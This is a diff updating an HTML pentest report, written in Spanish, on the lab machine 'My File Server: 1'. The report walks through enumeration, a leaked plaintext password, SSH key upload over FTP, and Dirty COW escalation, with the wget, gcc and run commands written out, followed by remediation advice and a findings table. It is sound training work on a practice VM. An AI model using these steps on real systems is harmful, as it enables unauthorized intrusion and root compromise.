@@ -77,93 +77,209 @@
 
             <div class="article-body">
 
+                <!-- 1. Resumen Ejecutivo -->
                 <section>
                     <h2>Resumen Ejecutivo</h2>
                     <p>
-                        Este informe documenta la prueba de penetración técnica realizada sobre la máquina vulnerable <strong>My File Server 1</strong>. El objetivo consistió en identificar configuraciones erróneas, servicios expuestos y vulnerabilidades a nivel de kernel que permitieran a un atacante local o remoto obtener acceso administrativo (root). Se logró el compromiso total del sistema tras extraer credenciales mediante Samba y aplicar el exploit Dirty COW localmente.
+                        El presente informe documenta la prueba de penetración realizada sobre la máquina vulnerable <strong>My File Server: 1</strong>. El objetivo fue evaluar la exposición de servicios, la existencia de credenciales expuestas y la posibilidad de escalada de privilegios. Durante la evaluación se identificaron credenciales en texto plano dentro de <code>/readme.txt</code>, un recurso SMB (<strong>smbdata</strong>) accesible con permisos de lectura/escritura y una vulnerabilidad local de escalada (explotación de <strong>Dirty COW</strong>) que permitió la obtención de privilegios de root. El riesgo combinado es <strong>alto</strong>.
                     </p>
                 </section>
 
+                <!-- 2. Alcance -->
                 <section>
-                    <h2>Fases de la Auditoría</h2>
-                    <h3>1. Reconocimiento y Enumeración</h3>
+                    <h2>Alcance</h2>
                     <p>
-                        Se identificó la dirección IP del objetivo dentro del segmento local mediante escaneo ARP y se realizó un análisis profundo con Nmap. Los puertos expuestos descubiertos incluyen:
+                        Evaluación negra (black-box) de la máquina virtual <strong>My File Server: 1</strong> con IP <code>192.168.56.103</code>.
+                    </p>
+                    <h3>Actividades incluidas</h3>
+                    <ul class="tech-list" style="margin-left: 1.5rem;">
+                        <li>Reconocimiento de red.</li>
+                        <li>Escaneo de puertos y servicios.</li>
+                        <li>Enumeración de servicios web y SMB.</li>
+                        <li>Intento de explotación de vulnerabilidades públicas.</li>
+                        <li>Pruebas de escalada de privilegios locales.</li>
+                    </ul>
+                    <h3>Fuera del alcance</h3>
+                    <ul class="tech-list" style="margin-left: 1.5rem;">
+                        <li>Ataques de denegación de servicio.</li>
+                        <li>Cambios permanentes en sistemas de terceros.</li>
+                    </ul>
+                </section>
+
+                <!-- 3. Metodología aplicada -->
+                <section>
+                    <h2>Metodología Aplicada</h2>
+                    <p>
+                        Enfoque estructurado basado en las fases <strong>PTES/OWASP</strong>:
                     </p>
                     <ul class="tech-list" style="margin-left: 1.5rem;">
-                        <li><strong>Puerto 21/TCP (FTP):</strong> Servicio de transferencia de archivos desactualizado.</li>
-                        <li><strong>Puerto 22/TCP (SSH):</strong> Permite accesos remotos seguros.</li>
-                        <li><strong>Puerto 80/TCP (HTTP):</strong> Servidor web Apache 2.4.6.</li>
-                        <li><strong>Puertos 139 y 445/TCP (Samba/SMB):</strong> Recurso compartido expuesto.</li>
+                        <li><strong>Fase 1:</strong> Reconocimiento pasivo y activo.</li>
+                        <li><strong>Fase 2:</strong> Enumeración detallada de servicios y versiones.</li>
+                        <li><strong>Fase 3:</strong> Identificación y validación de vulnerabilidades.</li>
+                        <li><strong>Fase 4:</strong> Explotación controlada para demostrar impacto.</li>
+                        <li><strong>Fase 5:</strong> Post-explotación y escalada de privilegios.</li>
+                        <li><strong>Fase 6:</strong> Análisis de impacto y recomendaciones.</li>
                     </ul>
+                </section>
 
-                    <h3>2. Explotación y Acceso Inicial</h3>
+                <!-- 4. Fases de reconocimiento -->
+                <section>
+                    <h2>Fases de Reconocimiento</h2>
                     <p>
-                        Mediante el uso de herramientas como <code>smbmap</code> y <code>smbclient</code>, se detectó un recurso compartido denominado <strong>smbdata</strong> accesible de manera anónima. Al enumerar su contenido, se halló un archivo <code>readme.txt</code> que exponía credenciales en texto plano para el servicio SSH. Con estas llaves de acceso, se estableció una sesión remota interactiva en el servidor.
+                        Se realizó reconocimiento pasivo con <code>netdiscover</code> para detectar hosts activos. Se identificó la IP <code>192.168.56.103</code> como la máquina víctima.
                     </p>
-
-                    <h3>3. Escalada de Privilegios Local</h3>
                     <p>
-                        Una vez dentro del sistema como usuario regular, se analizó el kernel de Linux subyacente. Se detectó una versión vulnerable a <strong>Dirty COW (CVE-2016-5195)</strong>, un fallo crítico de condición de carrera en el subsistema de memoria (Copy-On-Write). Se compiló localmente el exploit correspondiente y se ejecutó con éxito, sobrescribiendo el archivo <code>/etc/passwd</code> para inyectar una cuenta con UID 0 (root) y obteniendo acceso total como superusuario.
+                        Se ejecutó un escaneo activo de puertos y servicios con el siguiente comando para obtener la lista exhaustiva de puertos abiertos y versiones:
+                    </p>
+                    <p><code>nmap -p- 192.168.56.103 -sV</code></p>
+                </section>
+
+                <!-- 5. Enumeración -->
+                <section>
+                    <h2>Enumeración</h2>
+                    <p>
+                        Se utilizaron herramientas de enumeración para determinar vectores de ataque.
+                    </p>
+                    <h3>Enumeración web con Nikto</h3>
+                    <p>
+                        Se ejecutó <code>nikto -h</code> para enumerar directorios del servicio web. Nikto reveló el fichero <code>/readme.txt</code>. Al abrirlo se encontró la cadena <strong>"My password is rootroot1"</strong>. Con esto se obtuvo la contraseña <code>rootroot1</code> del usuario <code>smbuser</code>.
+                    </p>
+                    <h3>Enumeración SMB con smbmap</h3>
+                    <p>
+                        Se usó <code>sudo smbmap -H</code> para enumerar los recursos compartidos. <code>smbmap</code> mostró el recurso <strong>smbdata</strong> con permisos de lectura y escritura (R/W).
+                    </p>
+                    <h3>Servicio HTTP</h3>
+                    <p>
+                        El servicio HTTP reportó versión <strong>Apache 2.4.6</strong>.
                     </p>
                 </section>
 
+                <!-- 6. Explotación -->
                 <section>
-                    <h2>Tabla de Hallazgos Críticos</h2>
+                    <h2>Explotación</h2>
+                    <p>
+                        Se utilizó el comando <code>ftp</code> para conectarse al servidor de archivos. Los pasos realizados fueron:
+                    </p>
+                    <ul class="tech-list" style="margin-left: 1.5rem;">
+                        <li>Se generó la llave SSH con <code>sudo ssh-keygen</code>.</li>
+                        <li>Se subió al servidor remoto con <code>put id_ed25519.pub authorized_keys</code>.</li>
+                        <li>Se accedió con <code>ssh smbuser@192.168.56.103</code> sin necesidad de contraseña.</li>
+                    </ul>
+                </section>
+
+                <!-- 7. Escalada de privilegios -->
+                <section>
+                    <h2>Escalada de Privilegios</h2>
+                    <p>
+                        La escalada empleada fue <strong>Dirty COW (CVE-2016-5195)</strong>, que explota una condición de carrera en el mecanismo copy-on-write del kernel Linux. Los pasos realizados fueron:
+                    </p>
+                    <ul class="tech-list" style="margin-left: 1.5rem;">
+                        <li>Se descargó el exploit con <code>wget http://192.168.56.102:8080/dirtyCow.c</code>.</li>
+                        <li>Se compiló con <code>gcc dirtyCow.c -o Aznar -pthread</code>.</li>
+                        <li>Se ejecutó <code>./Aznar</code>.</li>
+                    </ul>
+                    <p>
+                        La ejecución del exploit permitió escalar privilegios dentro del sistema, obteniendo acceso como <strong>root</strong>.
+                    </p>
+                </section>
+
+                <!-- 8. Análisis de Impacto (Modelo CIA) -->
+                <section>
+                    <h2>Análisis de Impacto (Modelo CIA)</h2>
+                    <ul class="tech-list" style="margin-left: 1.5rem;">
+                        <li><strong>Confidencialidad:</strong> Comprometida por credenciales en texto plano (<code>/readme.txt</code>) y la posibilidad de leer el share SMB.</li>
+                        <li><strong>Integridad:</strong> Vulnerable ante modificaciones no autorizadas en el share (permisos R/W) y la capacidad de reemplazar binarios o ficheros críticos tras la escalada.</li>
+                        <li><strong>Disponibilidad:</strong> Posible interrupción si se eliminan o corrompen ficheros críticos o si el atacante instala procesos maliciosos.</li>
+                    </ul>
+                    <div class="quotation-box">
+                        <p><strong>Riesgo global: Alto.</strong></p>
+                    </div>
+                </section>
+
+                <!-- 9. Recomendaciones técnicas -->
+                <section>
+                    <h2>Recomendaciones Técnicas</h2>
+                    <ul class="tech-list" style="margin-left: 1.5rem;">
+                        <li><strong>1. Crítico (inmediato):</strong> Parchear el kernel para mitigar CVE-2016-5195; si no es posible, aislar la VM.</li>
+                        <li><strong>2. Alto:</strong> Eliminar credenciales en texto plano, rotar contraseñas expuestas.</li>
+                        <li><strong>3. Alto:</strong> Restringir permisos del share SMB usando ACLs y principios de menor privilegio; deshabilitar accesos anónimos.</li>
+                        <li><strong>4. Medio:</strong> Revisar y actualizar Apache (y demás servicios) según CVE.</li>
+                        <li><strong>5. Medio:</strong> Habilitar registros (<code>auditd</code>, syslog remoto) y alertas para accesos SMB/HTTP.</li>
+                        <li><strong>6. Bajo:</strong> Implementar gestión de secretos (vault).</li>
+                    </ul>
+                </section>
+
+                <!-- 10. Tabla de hallazgos -->
+                <section>
+                    <h2>Tabla de Hallazgos</h2>
                     <div class="table-container">
                         <table class="cyber-table">
                             <thead>
                                 <tr>
-                                    <th>ID Hallazgo</th>
-                                    <th>Vulnerabilidad Detectada</th>
+                                    <th>ID</th>
+                                    <th>Vulnerabilidad</th>
                                     <th>Severidad</th>
+                                    <th>Evidencia</th>
                                     <th>Impacto</th>
-                                    <th>Mitigación Recomendada</th>
+                                    <th>Recomendación</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 <tr>
-                                    <td><strong>H-01</strong></td>
-                                    <td>Recurso compartido SMB sin autenticar</td>
-                                    <td class="text-accent" style="color: #ff3e3e;">Alta</td>
-                                    <td>Fuga de credenciales críticas.</td>
-                                    <td>Restringir el acceso anónimo a recursos de red y aplicar cifrado.</td>
+                                    <td><strong>01</strong></td>
+                                    <td>Credencial en texto plano en <code>/readme.txt</code></td>
+                                    <td style="color: #ff3e3e;">Alta</td>
+                                    <td>Contenido: "My password is rootroot1"</td>
+                                    <td>Acceso no autorizado a SMB; exfiltración de datos</td>
+                                    <td>Eliminar ficheros con credenciales, rotar contraseñas, usar gestión de secretos</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>H-02</strong></td>
-                                    <td>Versión de Kernel vulnerable a Dirty COW</td>
-                                    <td class="text-accent" style="color: #ff3e3e;">Crítica</td>
-                                    <td>Escalada total de privilegios a root.</td>
-                                    <td>Actualizar y parchear inmediatamente el kernel del sistema operativo.</td>
+                                    <td><strong>02</strong></td>
+                                    <td>Share SMB <strong>smbdata</strong> con permisos de lectura/escritura</td>
+                                    <td style="color: #ff3e3e;">Alta</td>
+                                    <td>Salida de <code>smbmap</code> mostrando smbdata con R/W</td>
+                                    <td>Lectura/modificación/exfiltración de datos; posible pivote</td>
+                                    <td>Restringir permisos, aplicar ACLs, deshabilitar escritura cuando no sea necesaria</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>H-03</strong></td>
-                                    <td>Uso de FTP no cifrado</td>
+                                    <td><strong>03</strong></td>
+                                    <td>Vulnerabilidad local Dirty COW (CVE-2016-5195)</td>
+                                    <td style="color: #ff3e3e;">Crítica</td>
+                                    <td>Ejecución de exploit Dirty COW; compilación y ejecución del binario</td>
+                                    <td>Escalada a privilegios root; control total del sistema</td>
+                                    <td>Actualizar/parchear kernel; revisar integridad del sistema</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>04</strong></td>
+                                    <td>Versión de Apache potencialmente desactualizada (Apache 2.4.6)</td>
                                     <td style="color: #ffa500;">Media</td>
-                                    <td>Interceptación de credenciales en tránsito.</td>
-                                    <td>Deshabilitar el servicio FTP y sustituirlo por protocolos seguros (SFTP/SCP).</td>
+                                    <td>Resultado de <code>nmap</code> indicando Apache 2.4.6</td>
+                                    <td>Exposición a vulnerabilidades conocidas de la versión</td>
+                                    <td>Actualizar Apache a versión mantenida</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>05</strong></td>
+                                    <td>Prácticas inseguras en transferencia de claves (uso de FTP sin cifrado)</td>
+                                    <td style="color: #ffa500;">Media</td>
+                                    <td>Uso de <code>ftp</code> para subir clave pública</td>
+                                    <td>Posible intercepción de credenciales/transmisiones</td>
+                                    <td>Usar <code>scp</code>/<code>sftp</code> o mecanismos seguros; evitar FTP en producción</td>
                                 </tr>
                             </tbody>
                         </table>
                     </div>
                 </section>
 
+                <!-- 11. Bibliografías -->
                 <section>
-                    <h2>Análisis de Impacto (Modelo CIA)</h2>
+                    <h2>Bibliografías</h2>
                     <ul class="tech-list" style="margin-left: 1.5rem;">
-                        <li><strong>Confidencialidad: CRÍTICA.</strong> El atacante obtuvo acceso a archivos de configuración internos y contraseñas guardadas en texto plano.</li>
-                        <li><strong>Integridad: CRÍTICA.</strong> La explotación de Dirty COW posibilitó la escritura en archivos protegidos del sistema, alterando la base de datos de usuarios.</li>
-                        <li><strong>Disponibilidad: CRÍTICA.</strong> Con privilegios de administrador total (root), un atacante podría destruir servicios web o inhabilitar el hardware.</li>
+                        <li><strong>CVE-2016-5195:</strong> Vulnerabilidad "Dirty COW" (Kernel Linux).</li>
+                        <li><strong>PTES:</strong> Estándar de Ejecución de Pruebas de Penetración.</li>
+                        <li><strong>NVD (NIST):</strong> Base de Datos Nacional de Vulnerabilidades.</li>
+                        <li><strong>OWASP:</strong> Guía de seguridad en servicios web.</li>
+                        <li><strong>Manuales de Herramientas:</strong> Documentación oficial de Nmap, Nikto y SMBMap.</li>
                     </ul>
-                </section>
-
-                <section>
-                    <h2>Conclusión</h2>
-                    <div class="quotation-box">
-                        <p>
-                            El éxito de la intrusión resalta el riesgo inherente de mantener credenciales legibles en recursos compartidos y la falta de un ciclo de parcheo continuo sobre el kernel de los sistemas operativos. La remediación no solo debe centrarse en blindar el perímetro, sino también en asegurar que los sistemas internos no sean susceptibles a exploits locales conocidos de escalada.
-                        </p>
-                    </div>
                 </section>
 
             </div>
